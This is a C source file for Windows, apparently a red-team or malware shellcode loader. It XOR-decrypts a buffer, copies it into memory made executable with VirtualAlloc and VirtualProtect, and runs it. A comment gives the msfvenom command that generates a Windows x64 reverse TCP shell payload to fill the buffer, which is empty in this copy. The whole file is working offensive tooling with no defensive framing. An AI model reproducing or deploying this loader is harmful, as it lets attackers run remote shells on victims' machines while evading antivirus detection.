#include <stdio.h>
#include <Windows.h>

// storing encrypted buffer in .data section 
// msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f c
unsigned char buffer[] = 
"";

// Encrypt/Decrypt the buffer 
void XorPayloadDecryption(unsigned char* pShellcode, size_t sShellcodeSize, unsigned char encryptionKey) {
    for (size_t i = 0; i < sShellcodeSize; i++) {
        pShellcode[i] ^= encryptionKey;
    }
}

int XorPayloadExecution(unsigned char* pShellcode, size_t sShellcodeSize) {
    // Allocate executable memory
    void* execMem = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (execMem == NULL) {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return -1;
    }

    // Copy decrypted shellcode to allocated memory
    memcpy(execMem, pShellcode, sShellcodeSize);

    // Change memory protection to execute
    DWORD oldProtect;
    if (!VirtualProtect(execMem, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        VirtualFree(execMem, 0, MEM_RELEASE); // Free the allocated memory on failure
        return -1;
    }

    // Assuming the shellcode is a function of type void(*)()
    void (*shellcodeFunc)() = (void (*)())execMem;
    shellcodeFunc(); // Execute the shellcode

    // Clean up
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}

int main() {
    unsigned char key = 'k'; // Encryption key
    XorPayloadDecryption(buffer, sizeof(buffer), key);

    // Attempt to execute the decrypted payload
    if (XorPayloadExecution(buffer, sizeof(buffer)) != 0) {
        printf("[-]Payload execution failed.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
